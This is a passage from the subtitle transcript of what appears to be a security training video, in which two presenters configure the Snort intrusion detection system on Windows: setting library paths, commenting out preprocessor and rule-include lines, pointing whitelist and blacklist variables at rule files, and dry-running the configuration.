specify.\n\n941\n00:41:57.860 --> 00:42:01.530\nSo after dynamic engine, again,\nwe've got to specify the path.\n\n942\n00:42:01.530 --> 00:42:04.740\nNow, we do have there,\nlet's just click there.\n\n943\n00:42:04.740 --> 00:42:07.380\nSo we're gonna go in,\nwe're gonna do Snort Lib again.\n\n944\n00:42:07.380 --> 00:42:09.580\nSo let's go in and do that.\n\n945\n00:42:09.580 --> 00:42:10.890\nSo we'll get that, all right.\n\n946\n00:42:10.890 --> 00:42:15.404\nSo c colon Snort backslash lib, right.\n\n947\n00:42:15.404 --> 00:42:18.840\nWoops, hold on, I have that.\n\n948\n00:42:18.840 --> 00:42:19.916\nI forgot I had lib there.\n\n949\n00:42:19.916 --> 00:42:21.700\nLet's do that and let's do that.\n\n950\n00:42:24.460 --> 00:42:26.640\nAlright, so we got C snort lib right?\n\n951\n00:42:26.640 --> 00:42:29.610\nYou've seen the auto complete right,\nthe auto tab is there?\n\n952\n00:42:29.610 --> 00:42:33.150\nSo, you actually do have that option and\nnotepad, which is nice.\n\n953\n00:42:33.150 --> 00:42:37.640\nBut it's not necessarily going\nto be a good idea to use it.\n\n954\n00:42:37.640 --> 00:42:39.550\nBecause, unless you know and\nyou're paying attention,\n\n955\n00:42:39.550 --> 00:42:42.150\nyou know exactly what you want,\nyou gotta be real careful.\n\n956\n00:42:42.150 --> 00:42:44.240\nBecause there are some things\nthat are very close and\n\n957\n00:42:44.240 --> 00:42:45.720\nsimilar to each other in the file.\n\n958\n00:42:45.720 --> 00:42:47.490\nAnd if you choose the wrong one,\n\n959\n00:42:47.490 --> 00:42:49.420\nyou wind up with a path statement\nthat's gonna give you an error.\n\n960\n00:42:49.420 --> 00:42:49.920\nSo-\n&gt;&gt; [LAUGH]\n\n961\n00:42:49.920 --> 00:42:51.250\n&gt;&gt; I like to actually just do my own\n\n962\n00:42:51.250 --> 00:42:51.860\ntyping here.\n\n963\n00:42:51.860 --> 00:42:54.620\nI don't like to actually go in and\nuse the autocomplete.\n\n964\n00:42:54.620 --> 00:42:56.690\nBut it's nice to know it is there.\n\n965\n00:42:56.690 --> 00:42:59.363\nSo snort underscore dynamic engine, now,\n\n966\n00:42:59.363 --> 00:43:02.940\nwe have to change what comes\nafter dynamic engine here.\n\n967\n00:43:02.940 --> 00:43:05.090\nBecause we need to put a different dll in.\n\n968\n00:43:05.090 --> 00:43:11.850\nWe're gonna put in SF engine or\nSF_engine.dll, not the libsf engine.so.\n\n969\n00:43:11.850 --> 00:43:13.510\nCuz we're not running this in Linux.\n\n970\n00:43:13.510 --> 00:43:16.340\nWe're running it in Windows and\nwe have to specify the appropriate dll.\n\n971\n00:43:16.340 --> 00:43:17.230\nSo we're gonna change that.\n\n972\n00:43:17.230 --> 00:43:19.000\nSo we're gonna just\nbackspace out of there.\n\n973\n00:43:19.000 --> 00:43:23.339\nWe're gonna add in the backslash, and\n\n974\n00:43:23.339 --> 00:43:26.889\nthen we're gonna put in sf_ and\n\n975\n00:43:26.889 --> 00:43:31.374\nwe're gonna do engine, engine.dll.\n\n976\n00:43:31.374 --> 00:43:35.445\nSo we're gonna put in the appropriate\nfile there, so we're typing that in.\n\n977\n00:43:35.445 --> 00:43:38.760\nThat's gonna allow us to\ninitialize snort when we run it.\n\n978\n00:43:38.760 --> 00:43:40.270\nSo, we're gonna go in and do that.\n\n979\n00:43:40.270 --> 00:43:42.678\nNow that we've done that,\nwe're gonna go in, and\n\n980\n00:43:42.678 --> 00:43:45.762\nI'm gonna hit save here in just a minute,\nand we're gonna go in.\n\n981\n00:43:45.762 --> 00:43:49.700\nAnd let's do that first,\nbefore we even do anything else.\n\n982\n00:43:49.700 --> 00:43:50.460\nLet's just save that.\n\n983\n00:43:50.460 --> 00:43:51.180\nAll right.\nSo, now,\n\n984\n00:43:51.180 --> 00:43:52.935\nwe're gonna do a little find and replace.\n\n985\n00:43:52.935 --> 00:43:57.305\nSo we're just gonna come back here to\nsearch, and we're gonna do the replace.\n\n986\n00:43:57.305 --> 00:44:01.425\nSo, it's gonna bring up that other\ninterface, and just walk through there and\n\n987\n00:44:01.425 --> 00:44:02.995\nnotice DLL was the last thing I was on.\n\n988\n00:44:02.995 --> 00:44:05.690\nIt's highlighted so it's automatically\npopulated in the find and\n\n989\n00:44:05.690 --> 00:44:09.640\nreplace window which is important to know\nbecause if you're not paying attention,\n\n990\n00:44:09.640 --> 00:44:12.320\nyou may wind up doing\nsomething you don't wanna do.\n\n991\n00:44:12.320 --> 00:44:16.930\nSo just making sure that we're, obviously,\nthinking about what's going on in there.\n\n992\n00:44:16.930 --> 00:44:19.220\nAll right so\nwe're just gonna erase what's there,\n\n993\n00:44:19.220 --> 00:44:21.620\ncuz we don't wanna get\nstuck with that by mistake.\n\n994\n00:44:21.620 --> 00:44:28.650\nWe're gonna look for pre, and I just\ntype prep, so, pre processor normalize.\n\n995\n00:44:31.260 --> 00:44:34.890\nAnd instead, and I'm gonna cheat\na little bit, I'm gonna cut and\n\n996\n00:44:34.890 --> 00:44:40.170\npaste, cuz the chances of me typing that\ncorrectly twice are basically none, right?\n\n997\n00:44:40.170 --> 00:44:45.320\nSo we're gonna put a hash tag there and\nthen we're gonna do that,\n\n998\n00:44:45.320 --> 00:44:48.240\nand we get this little prompt every so\noften when I cut and paste.\n\n999\n00:44:48.240 --> 00:44:49.150\nWe're just gonna do that.\n\n1000\n00:44:49.150 --> 00:44:51.530\nWe're to look for\nevery instance of pre processor or\n\n1001\n00:44:51.530 --> 00:44:54.870\nnormalize, we wanna\nreplace it with a hash or\n\n1002\n00:44:54.870 --> 00:44:58.180\nessentially a REM statement that says,\nhey don't pay attention to it.\n\n1003\n00:44:58.180 --> 00:45:01.920\nSo we're gonna do that and\nwe're gonna go into replace them and\n\n1004\n00:45:01.920 --> 00:45:03.640\nwe should get five occurrences here.\n\n1005\n00:45:03.640 --> 00:45:05.410\nSo we're gonna do replace all.\n\n1006\n00:45:06.800 --> 00:45:09.450\nLet that go, we got our five\noccurrences down there in blue,\n\n1007\n00:45:09.450 --> 00:45:11.590\nI know it's hard to see but\nit does say five.\n\n1008\n00:45:11.590 --> 00:45:13.940\nAnd by the way,\nif I can see it from where I'm standing,\n\n1009\n00:45:13.940 --> 00:45:16.320\nthen you guys better put your\nnoses up against the screen and\n\n1010\n00:45:16.320 --> 00:45:19.420\ntake a look at that cuz you should\nbe able to tell what that says.\n\n1011\n00:45:19.420 --> 00:45:22.150\nI'm a good 20 feet away from that monitor,\nprobably.\n\n1012\n00:45:22.150 --> 00:45:23.480\nAnd I'm lying.\n\n1013\n00:45:23.480 --> 00:45:24.090\nI can't see it.\n\n1014\n00:45:24.090 --> 00:45:25.635\nI just know it's there\nbecause I already did it.\n\n1015\n00:45:25.635 --> 00:45:26.690\n&gt;&gt; [LAUGH]\n&gt;&gt; But the point is,\n\n1016\n00:45:26.690 --> 00:45:28.800\nyou should still be able to\ntell if you look carefully.\n\n1017\n00:45:28.800 --> 00:45:29.580\n&gt;&gt; [LAUGH]\n&gt;&gt; So we did,\n\n1018\n00:45:29.580 --> 00:45:32.578\nit does actually replaced all five\ninstances just wanna know about that.\n\n1019\n00:45:32.578 --> 00:45:36.307\nAll right, so now what we're gonna do,\nwe've done that,\n\n1020\n00:45:36.307 --> 00:45:41.464\nwe're gonna go ahead and, as I mentioned,\nby doing the actual hashtag, right?\n\n1021\n00:45:41.464 --> 00:45:46.345\nWe are actually going in and we are gonna\nget rid of all those statement or,\n\n1022\n00:45:46.345 --> 00:45:49.700\nessentially, tell it to ignore them,\nright.\n\n1023\n00:45:49.700 --> 00:45:53.280\nAnd so what we're gonna do just\nto check that, is the following.\n\n1024\n00:45:55.710 --> 00:45:57.989\nJust take that real quick and.\n\n1025\n00:46:01.309 --> 00:46:03.874\nJust so you could see that.\n\n1026\n00:46:03.874 --> 00:46:09.720\nAnd let's just go over there and\nlet's just paste that in there.\n\n1027\n00:46:10.740 --> 00:46:14.910\nAnd when you go down, you could see all\nthe ones we just essentially ran down,\n\n1028\n00:46:14.910 --> 00:46:16.010\nthey're all right there.\n\n1029\n00:46:16.010 --> 00:46:20.130\nAll five of those were without\nthe hashtag before we came through, and\n\n1030\n00:46:20.130 --> 00:46:21.580\nwe just did the find, replace.\n\n1031\n00:46:21.580 --> 00:46:24.160\nIt didn't scroll down and\nhighlight it directly.\n\n1032\n00:46:24.160 --> 00:46:25.730\nSo, yeah, I just want you to see it.\n\n1033\n00:46:25.730 --> 00:46:28.970\nSo, just switching to the find,\nreal quick, we could see there,\n\n1034\n00:46:28.970 --> 00:46:33.780\nin the pre processor, that we're going\nthrough in the normalizer for IP4.\n\n1035\n00:46:33.780 --> 00:46:35.530\nICMP, IP6, etc.\n\n1036\n00:46:35.530 --> 00:46:38.330\nWe're just ramming those\nstatements out essentially, right.\n\n1037\n00:46:38.330 --> 00:46:40.100\nAnd just saying, hey, ignore them.\n\n1038\n00:46:40.100 --> 00:46:45.270\nAll right, so now what we're gonna do is\nwe're gonna go in and we're gonna search.\n\n1039\n00:46:45.270 --> 00:46:46.090\nSo we're in the find.\n\n1040\n00:46:46.090 --> 00:46:47.500\nSo let's just go up here to find.\n\n1041\n00:46:47.500 --> 00:46:49.730\nAnd we're gonna look for\na variable string.\n\n1042\n00:46:49.730 --> 00:46:55.642\nSo we're gonna do var and\nwe're gonna do white_list_path,\n\n1043\n00:46:55.642 --> 00:46:59.850\ncuz we wanna find the white list path.\n\n1044\n00:46:59.850 --> 00:47:02.190\nAnd we could see it right\nthere in the black list path.\n\n1045\n00:47:02.190 --> 00:47:05.780\nBecause this is gonna be the allow in deny\nlist that we're gonna use, right, for\n\n1046\n00:47:05.780 --> 00:47:09.215\nthe rule, and\nthat we're gonna essentially set.\n\n1047\n00:47:09.215 --> 00:47:10.505\nSo we're gonna go in.\n\n1048\n00:47:10.505 --> 00:47:15.065\nNow, we've actually created files for\nthis.\n\n1049\n00:47:15.065 --> 00:47:18.115\nWe just pre flighted that part and\ncreated them.\n\n1050\n00:47:18.115 --> 00:47:19.720\nLet me just go in quickly here.\n\n1051\n00:47:19.720 --> 00:47:24.530\nAnd we'll just go up one level, and\nwe'll go back down to rules and\n\n1052\n00:47:24.530 --> 00:47:30.360\nwe've downloaded a black list.rules\nfile which is sitting right there,\n\n1053\n00:47:30.360 --> 00:47:33.240\nI know it's kinda hard to see and\nwe'll open it up so\n\n1054\n00:47:33.240 --> 00:47:36.030\nyou can take a look in a minute and\nsee what the rules look like.\n\n1055\n00:47:36.030 --> 00:47:38.900\nIt's about a megabyte\nin size approximately.\n\n1056\n00:47:38.900 --> 00:47:40.710\nAnd I've created two additional files.\n\n1057\n00:47:40.710 --> 00:47:43.880\nOne that is white_list.rules.\n\n1058\n00:47:43.880 --> 00:47:45.630\nOne that is black_list.rules.\n\n1059\n00:47:45.630 --> 00:47:48.130\nThey are both empty right now,\nthey're sitting there.\n\n1060\n00:47:48.130 --> 00:47:50.050\nWe're gonna be just referencing them.\n\n1061\n00:47:50.050 --> 00:47:53.801\nRule files can be gathered up and\nfound on the internet for snort.\n\n1062\n00:47:53.801 --> 00:47:55.353\nYou can make your own.\n\n1063\n00:47:55.353 --> 00:47:59.066\nYeah, there's a whole art, science,\nand subculture to writing rules and\n\n1064\n00:47:59.066 --> 00:48:00.874\nyou have a Had experience with that.\n\n1065\n00:48:00.874 --> 00:48:01.758\n&gt;&gt; Yeah.\n&gt;&gt; And what you and\n\n1066\n00:48:01.758 --> 00:48:03.427\nI were talking about\nyour little story there.\n\n1067\n00:48:03.427 --> 00:48:04.418\n&gt;&gt; Yeah.\n&gt;&gt; Let's just open this up\n\n1068\n00:48:04.418 --> 00:48:05.067\nwhile you're talking.\n\n1069\n00:48:05.067 --> 00:48:06.850\n&gt;&gt; Yeah, absolutely.\n\n1070\n00:48:06.850 --> 00:48:07.805\nAnd I was going out, too.\n\n1071\n00:48:07.805 --> 00:48:10.537\nI was actually at a school out in\nCalifornia Tech, getting some training out\n\n1072\n00:48:10.537 --> 00:48:14.370\nthere for Certified Ethical Hackers, as\na matter fact, this was a few years ago.\n\n1073\n00:48:14.370 --> 00:48:16.600\nAnd a gentleman was walking out and\n\n1074\n00:48:16.600 --> 00:48:20.260\nI did not realize they made three\nring binders quite this big.\n\n1075\n00:48:20.260 --> 00:48:25.230\nIt was a good 6-8\" inches, and I said\nwhat the heck are you studying for, and\n\n1076\n00:48:25.230 --> 00:48:28.170\nhe was studying up how\nto write Snort rules.\n\n1077\n00:48:28.170 --> 00:48:32.490\nIt was a large, large binder so,\nit's not that its overly complex but\n\n1078\n00:48:32.490 --> 00:48:35.220\nthere's a lot of options,\na lot of capabilities in it.\n\n1079\n00:48:35.220 --> 00:48:36.930\nIt can get a little complex.\n\n1080\n00:48:36.930 --> 00:48:39.930\n&gt;&gt; It can absolutely and so let's look\nat an example of that real quick so.\n\n1081\n00:48:39.930 --> 00:48:43.190\nWhen we look at the blacklist rules in\nthe file, the one that's populated.\n\n1082\n00:48:43.190 --> 00:48:46.740\nYou can see each one of these\nlines is an individual rule.\n\n1083\n00:48:46.740 --> 00:48:51.120\nAnd if you remember in our just kinda\nramp-up preview around Snort, as Mike and\n\n1084\n00:48:51.120 --> 00:48:52.460\nI we're talking before we came into demo.\n\n1085\n00:48:52.460 --> 00:48:55.290\nOne of the things we called out in our\nlittle hit list of things to know about\n\n1086\n00:48:55.290 --> 00:48:57.950\nSnort was that the rule processor, right,\n\n1087\n00:48:57.950 --> 00:49:00.000\ncan actually only take\nrules one line at a time.\n\n1088\n00:49:00.000 --> 00:49:02.000\nSo all your rules have to be\nwritten as single line rules,\n\n1089\n00:49:02.000 --> 00:49:03.890\nno matter how long they are.\n\n1090\n00:49:03.890 --> 00:49:09.330\nAnd so these are all rules alert on UDP,\nalert on TCP you could see them there.\n\n1091\n00:49:09.330 --> 00:49:15.970\nAs we scroll across we can see just\nhow crazy some of these rules get.\n\n1092\n00:49:15.970 --> 00:49:18.500\nWith our options and our actions.\n\n1093\n00:49:18.500 --> 00:49:23.653\nJust stop me when you want me\nto essentially stop, right?\n\n1094\n00:49:23.653 --> 00:49:27.380\nI got like halfway through and\nyou could see that there's\n\n1095\n00:49:27.380 --> 00:49:30.582\na couple there that just keep going and\ngoing and going and going.\n\n1096\n00:49:30.582 --> 00:49:32.920\nRight?\nSo, that's what rules look like and\n\n1097\n00:49:32.920 --> 00:49:34.520\nyou write them one line at a time.\n\n1098\n00:49:34.520 --> 00:49:39.130\nThis file has quite a number of\nthem in there for blacklist just so\n\n1099\n00:49:39.130 --> 00:49:39.810\nyou could see that.\n\n1100\n00:49:39.810 --> 00:49:43.180\nSo we're gonna go and just mess around\nwith this path statement now because it's\n\n1101\n00:49:43.180 --> 00:49:47.910\nessentially just a ../ directory,\nyou know basically a-\n\n1102\n00:49:47.910 --> 00:49:49.150\n&gt;&gt; A place holder or-\n\n1103\n00:49:49.150 --> 00:49:51.160\n&gt;&gt; Place holder we gotta go in, thank you.\n\n1104\n00:49:51.160 --> 00:49:53.180\nWe've got to go in,\nwe've gotta actually modify that.\n\n1105\n00:49:53.180 --> 00:49:55.320\nSo we're gonna go in and\nwe're gonna do that right now.\n\n1106\n00:49:55.320 --> 00:49:55.920\nWe're gonna go in and\n\n1107\n00:49:55.920 --> 00:50:00.150\nchange that into the C colon snort slash\nrules directory that we've created.\n\n1108\n00:50:00.150 --> 00:50:03.770\nSo, we're just gonna come in here and\nwe're gonna do that.\n\n1109\n00:50:03.770 --> 00:50:07.643\nWe're gonna do it for both, by the way so,\n\n1110\n00:50:07.643 --> 00:50:13.530\nit we'll just do this and\nwe'll do c:snort and then rules.\n\n1111\n00:50:13.530 --> 00:50:15.080\nSo, that we can set that up.\n\n1112\n00:50:16.700 --> 00:50:17.590\nJust click there.\n\n1113\n00:50:17.590 --> 00:50:21.110\nSo, it's gonna look like that right and\nthen we'll just do the same thing for\n\n1114\n00:50:21.110 --> 00:50:25.465\nthe blacklist cuz, we obviously have\nto have both of those set the same way.\n\n1115\n00:50:25.465 --> 00:50:32.056\nC:/snort/rules.\n\n1116\n00:50:32.056 --> 00:50:35.830\nAll right, so we've got both of those so\nnow that's gonna point to\n\n1117\n00:50:35.830 --> 00:50:38.920\nthat directory that I just showed\nyou where our rules list is and\n\n1118\n00:50:38.920 --> 00:50:40.700\nit's gonna be able to pull the rules in.\n\n1119\n00:50:40.700 --> 00:50:42.940\nWhen we actually go to run this thing.\n\n1120\n00:50:42.940 --> 00:50:45.330\nSo now what we need to\ndo is we need to find.\n\n1121\n00:50:45.330 --> 00:50:47.620\nSo we're gonna go back up here to find.\n\n1122\n00:50:47.620 --> 00:50:54.290\nWe have to find our variable,\ndollar sign white underscore list.\n\n1123\n00:50:55.930 --> 00:50:58.090\nSo we're gonna go look for that.\n\n1124\n00:50:59.660 --> 00:51:02.370\nAnd that's gonna be right here\nalong with our blacklist variable.\n\n1125\n00:51:02.370 --> 00:51:05.050\nAnd again we have to specify and\nmodify the path here right?\n\n1126\n00:51:05.050 --> 00:51:06.720\nSo we're go in and we're going to do that.\n\n1127\n00:51:06.720 --> 00:51:10.870\nAnd this statement is the statement\nthat's gonna feed that path\n\n1128\n00:51:10.870 --> 00:51:12.000\nstatement into the variable and\n\n1129\n00:51:12.000 --> 00:51:15.270\nthen use the variable path that we\nprovided to actually load the rules.\n\n1130\n00:51:15.270 --> 00:51:18.330\nSo we just have to follow the basic\n\n1131\n00:51:18.330 --> 00:51:20.870\nthought process around any\nprogrammatic language.\n\n1132\n00:51:20.870 --> 00:51:23.010\nWe always have some sort\nof variable placeholder.\n\n1133\n00:51:23.010 --> 00:51:26.120\nYou were making, you and I were talking,\nI think, before we got started and\n\n1134\n00:51:26.120 --> 00:51:28.720\nyou were making the point that Hey,\nif you would just go in, and\n\n1135\n00:51:28.720 --> 00:51:31.950\nwhen you're writing Access and\nyou're in Access writing query code,\n\n1136\n00:51:31.950 --> 00:51:35.640\nif you'd just get out of the, hey,\nthis is the general view box, and\n\n1137\n00:51:35.640 --> 00:51:39.290\nactually look at the Transact-SQL or the\nT-SQL or whatever it is, Access VBA for\n\n1138\n00:51:39.290 --> 00:51:43.895\nAccess, depending on what you're doing you\nwould actually see the logic of the code.\n\n1139\n00:51:43.895 --> 00:51:47.185\nSo this is really that thought process,\njust understanding all that.\n\n1140\n00:51:47.185 --> 00:51:48.455\nSo we're gonna go in, and\n\n1141\n00:51:49.895 --> 00:51:55.430\nwhat we're gonna do is make sure that\nwe come in here, WHITE_LIST_PATH.\n\n1142\n00:51:55.430 --> 00:51:58.310\nWe're just gonna change this,\nso let me come in here.\n\n1143\n00:51:58.310 --> 00:52:01.562\nLet me just flip that around so\nit does that.\n\n1144\n00:52:01.562 --> 00:52:06.590\nWhite list is now gonna be,\nyou know white list path white_list.rules,\n\n1145\n00:52:06.590 --> 00:52:09.778\nphone now this Is important to note.\n\n1146\n00:52:09.778 --> 00:52:11.780\nThis is gonna stay there,\n\n1147\n00:52:11.780 --> 00:52:15.340\nbecause it's gonna essentially\nroll over to this line right here.\n\n1148\n00:52:15.340 --> 00:52:18.740\nSo, we don't want to get rid of\nthat back slash after the comma,\n\n1149\n00:52:18.740 --> 00:52:20.870\nbecause then we're going to\nlose the black list option.\n\n1150\n00:52:20.870 --> 00:52:23.030\nWhen you're editing don't delete that one.\n\n1151\n00:52:23.030 --> 00:52:23.930\nRight?\nEven though we're\n\n1152\n00:52:23.930 --> 00:52:27.060\nchanging the forward slash\non each of the paths.\n\n1153\n00:52:27.060 --> 00:52:28.840\nDon't actually go in there and\nmodify that.\n\n1154\n00:52:28.840 --> 00:52:30.960\nAll right?\nSo we're just gonna go in and do that.\n\n1155\n00:52:30.960 --> 00:52:32.990\nNow we did create the white\nunderscore list and\n\n1156\n00:52:32.990 --> 00:52:35.300\nblack underscore list dot rules files,\nright?\n\n1157\n00:52:35.300 --> 00:52:39.610\nI showed you that, so those are files we\ncreated and we're just simply pathing it\n\n1158\n00:52:39.610 --> 00:52:43.230\nthere and telling it how to find it,\nso wanna make sure we know that.\n\n1159\n00:52:44.740 --> 00:52:48.353\nAnd then what we're gonna do\nis we're gonna go in here, and\n\n1160\n00:52:48.353 --> 00:52:50.990\nwe're gonna come up here.\n\n1161\n00:52:50.990 --> 00:52:54.477\nAnd we are going to go look for\none more variable,\n\n1162\n00:52:54.477 --> 00:52:57.218\nwhich will be the rule path variable.\n\n1163\n00:52:57.218 --> 00:53:01.316\nSo we're gonna do dollar\nsign Rule_path and\n\n1164\n00:53:01.316 --> 00:53:05.647\nthen blacklist.rules.\n\n1165\n00:53:05.647 --> 00:53:12.100\nSo we're gonna look for that and\nthere, it's right there.\n\n1166\n00:53:12.100 --> 00:53:15.810\nIt's down in the list of all\nthe categories that are enabled and\n\n1167\n00:53:15.810 --> 00:53:19.600\nby default all of these rule\ncategories are enabled.\n\n1168\n00:53:19.600 --> 00:53:22.279\nNow the problem is we don't have all\nthese rule categories set up and\n\n1169\n00:53:22.279 --> 00:53:23.560\nwe haven't loaded them.\n\n1170\n00:53:23.560 --> 00:53:27.230\nWe've only loaded the blacklist rules for\njust purposes of the demonstration.\n\n1171\n00:53:27.230 --> 00:53:30.760\nObviously in the real world, we probably\nwanna be thinking about app detect\n\n1172\n00:53:30.760 --> 00:53:33.920\nrules and attack responses,\nwhatever the case may be.\n\n1173\n00:53:33.920 --> 00:53:37.280\nCuz we do have those capabilities but\nchat rules,\n\n1174\n00:53:37.280 --> 00:53:40.290\nbrowser web kit rules, plug-ins,\nif you down the list you can see.\n\n1175\n00:53:40.290 --> 00:53:44.760\nThere's a file for browser Chrome,\nbrowser Firefox, browser IE.\n\n1176\n00:53:44.760 --> 00:53:46.930\nRight, so\nwe do have the capability to go in and\n\n1177\n00:53:46.930 --> 00:53:50.712\nbe very specific here about\nwhat we wanna monitor for.\n\n1178\n00:53:50.712 --> 00:53:54.140\nWe've gotta then create rules, that's\nwhy the guy had the binder that was.\n\n1179\n00:53:54.140 --> 00:53:54.960\n&gt;&gt; Yeah.\n[LAUGH]\n\n1180\n00:53:54.960 --> 00:53:55.840\n&gt;&gt; That big because he\n\n1181\n00:53:55.840 --> 00:53:59.580\nobviously know he was going through and\nlooking at all these different options.\n\n1182\n00:53:59.580 --> 00:54:01.490\nSo we're gonna go,\nwe're gonna find this line.\n\n1183\n00:54:01.490 --> 00:54:09.250\nAnd what we're gonna do is we're gonna\nmake sure that we do the following.\n\n1184\n00:54:09.250 --> 00:54:16.290\nWe're just gonna, again, flip around\nthat forward slash, make it a backslash.\n\n1185\n00:54:16.290 --> 00:54:17.578\nJust so that we're clear.\n\n1186\n00:54:17.578 --> 00:54:22.150\nCuz that's gonna be how we go in and find\nour past database on the editing up above.\n\n1187\n00:54:22.150 --> 00:54:24.530\nBut now what we need to do is say,\nhey you know what,\n\n1188\n00:54:24.530 --> 00:54:29.908\nwe need to ignore all of these other rules\nbecause we're not gonna enable them right?\n\n1189\n00:54:29.908 --> 00:54:33.100\nSo we've gotta go in and\nwe've gotta actually,\n\n1190\n00:54:33.100 --> 00:54:36.460\nessentially put a hash mark in front\nof every line to rem them out.\n\n1191\n00:54:36.460 --> 00:54:38.430\nBecause, otherwise we're\ngonna have a problem.\n\n1192\n00:54:38.430 --> 00:54:42.180\nNow we could that by hand, this would also\nbe a great place for us to think about\n\n1193\n00:54:42.180 --> 00:54:47.260\nimporting some of that intern labor\nthat we've been talking about.\n\n1194\n00:54:47.260 --> 00:54:48.560\nHave I got a job for you.\n\n1195\n00:54:48.560 --> 00:54:50.600\nThis is gonna look awesome\non your resume by the way.\n\n1196\n00:54:50.600 --> 00:54:52.270\nYou could actually tell people.\n\n1197\n00:54:52.270 --> 00:54:56.440\nYou are a snort rules expert by the time\nyou're done for this particular job.\n\n1198\n00:54:56.440 --> 00:54:58.715\nSo Johnny, have I got a job for\nyou, right?\n\n1199\n00:54:58.715 --> 00:55:00.940\n[LAUGH] So\nwhat we're gonna do is the following.\n\n1200\n00:55:00.940 --> 00:55:04.180\nWe're gonna go in and\ndo the find replace now, right?\n\n1201\n00:55:04.180 --> 00:55:08.178\nAnd instead of you leaving it as include\nspace dollar sign rule underscore path\n\n1202\n00:55:08.178 --> 00:55:11.511\nwe're to search for that and\nthen add a little hashtag in front and\n\n1203\n00:55:11.511 --> 00:55:13.670\nrem out everything else, right.\n\n1204\n00:55:13.670 --> 00:55:14.490\nSo we're gonna do that.\n\n1205\n00:55:14.490 --> 00:55:17.890\nNow the trick here is just to\nbe clear on what we're gonna do.\n\n1206\n00:55:17.890 --> 00:55:22.620\nSince I changed the one that we wanna use\nblacklist.rules// we're gonna do include\n\n1207\n00:55:22.620 --> 00:55:24.707\ndollar sign rulepath forward slash.\n\n1208\n00:55:24.707 --> 00:55:28.520\nWe're gonna get everything else and\nleave black list alone, right.\n\n1209\n00:55:28.520 --> 00:55:32.203\nSo little slight of hand here if you will.\n\n1210\n00:55:32.203 --> 00:55:33.080\nAll right.\n\n1211\n00:55:33.080 --> 00:55:36.580\nSo, we're gonna go and\ndo that we're gonna do find and replace.\n\n1212\n00:55:36.580 --> 00:55:38.370\nSo we're gonna do search.\n\n1213\n00:55:38.370 --> 00:55:40.720\nWe're gonna do replace.\n\n1214\n00:55:40.720 --> 00:55:43.760\nSo, we're to come over here and\nwhat we're gonna do is the following.\n\n1215\n00:55:43.760 --> 00:55:45.580\nWe're gonna just backspace over there.\n\n1216\n00:55:45.580 --> 00:55:52.473\nTo the include $RULE_PATH.\n\n1217\n00:55:52.473 --> 00:55:54.787\nAnd then a forward slash, right?\n\n1218\n00:55:54.787 --> 00:55:56.244\n&gt;&gt; Mm-hm.\n\n1219\n00:55:56.244 --> 00:56:01.306\n&gt;&gt; So we're gonna do that, and\nthen we're just gonna Grab that,\n\n1220\n00:56:01.306 --> 00:56:07.716\nand we're gonna go over here, and we're\ngonna paste that in, get rid of that.\n\n1221\n00:56:07.716 --> 00:56:10.279\nAnd come over here, and sure we're there,\n\n1222\n00:56:10.279 --> 00:56:13.213\njust do a little hashtag there,\nand you replace.\n\n1223\n00:56:13.213 --> 00:56:19.035\nReplace All, and\nwe're gonna get all of those replaced.\n\n1224\n00:56:19.035 --> 00:56:21.707\nSo you can see it just went right\ndown the list, did them all, right.\n\n1225\n00:56:21.707 --> 00:56:23.572\n&gt;&gt; Skipping [CROSSTALK]\n&gt;&gt; Yeah,\n\n1226\n00:56:23.572 --> 00:56:25.245\nwe're gonna get 104 of them, right.\n\n1227\n00:56:25.245 --> 00:56:27.728\nSo I said that would keep Johnny busy for\na little bit.\n\n1228\n00:56:27.728 --> 00:56:29.670\n&gt;&gt; [LAUGH]\n&gt;&gt; Keep him out of trouble.\n\n1229\n00:56:29.670 --> 00:56:31.250\nAlright, so\nI haven't save the in a little bit.\n\n1230\n00:56:31.250 --> 00:56:32.880\nI've done a couple things without saving.\n\n1231\n00:56:32.880 --> 00:56:34.680\nShame on me for doing that by the way.\n\n1232\n00:56:34.680 --> 00:56:38.710\nSo we're just gonna go over and save real\nquick and make sure that we have that set.\n\n1233\n00:56:38.710 --> 00:56:43.350\nNow, we've actually finished modifying\nthe config or the snort to com file.\n\n1234\n00:56:43.350 --> 00:56:45.380\n&gt;&gt; So what we're gonna do now, so\nwe're gonna go give it a shot.\n\n1235\n00:56:45.380 --> 00:56:46.860\nWe're gonna see if it's gonna work.\n\n1236\n00:56:46.860 --> 00:56:49.460\nSo I'm gonna minimize it cuz we\nmay need to come back in and\n\n1237\n00:56:49.460 --> 00:56:51.290\nedit it if we have made a mistake.\n\n1238\n00:56:51.290 --> 00:56:53.880\nAnd it is possible here and\nthere we may have a typo.\n\n1239\n00:56:53.880 --> 00:56:57.070\nNow I said that we could just load\nthis thing and let it run, right?\n\n1240\n00:56:57.070 --> 00:56:59.900\nAnd if there was an error we would know,\nbut I told you I'd show you a way that we\n\n1241\n00:56:59.900 --> 00:57:03.490\ncan pre-flight that CON file and\njust make sure the config is good.\n\n1242\n00:57:03.490 --> 00:57:05.800\nSo what we're gonna do is the following.\n\n1243\n00:57:05.800 --> 00:57:08.560\nWe're going to just bring\nthat command line back up,\n\n1244\n00:57:08.560 --> 00:57:13.300\nso, let's type in a new command.\n\n1245\n00:57:13.300 --> 00:57:15.248\nWe'll just start with snort.\n\n1246\n00:57:15.248 --> 00:57:21.590\nAnd -I and then 1 and then -L for log.\n\n1247\n00:57:21.590 --> 00:57:28.892\nAnd then let's specify our paths\nwe'll do snort and we'll do log.\n\n1248\n00:57:28.892 --> 00:57:35.920\nAnd then C for capture, and\nconfigure information will be listed here.\n\n1249\n00:57:35.920 --> 00:57:40.660\nSo we're gonna go in and tell it where to\nfind the snort config files, the snortexe,\n\n1250\n00:57:40.660 --> 00:57:46.370\nand then snort.com for\nthe name of the file and then\n\n1251\n00:57:46.370 --> 00:57:52.420\nwe are going to do -T for our ability to\ngo through and essentially do a dry run.\n\n1252\n00:57:52.420 --> 00:57:56.630\nSo we are gonna run this command and\nif there is any issue\n\n1253\n00:57:56.630 --> 00:58:00.110\nit's gonna spit out an error and say,\nhey, by the way this line, this problem.\n\n1254\n00:58:00.110 --> 00:58:02.550\nNotice it came through,\nno problem, everything is good.\n\n1255\n00:58:02.550 --> 00:58:03.260\nRight.\n\n1256\n00:58:03.260 --> 00:58:05.070\nBecause you know why?\n\n1257\n00:58:05.070 --> 00:58:06.250\nBecause I did the best.\n\n1258\n00:58:06.250 --> 00:58:06.942\n&gt;&gt; You did a great job.\n\n1259\n00:58:06.942 --> 00:58:07.538\n&gt;&gt; No I did my best.\n\n1260\n00:58:07.538 --> 00:58:08.169\n&gt;&gt; You did your best.\n\n1261\n00:58:08.169 --> 00:58:08.850\n&gt;&gt; I did my 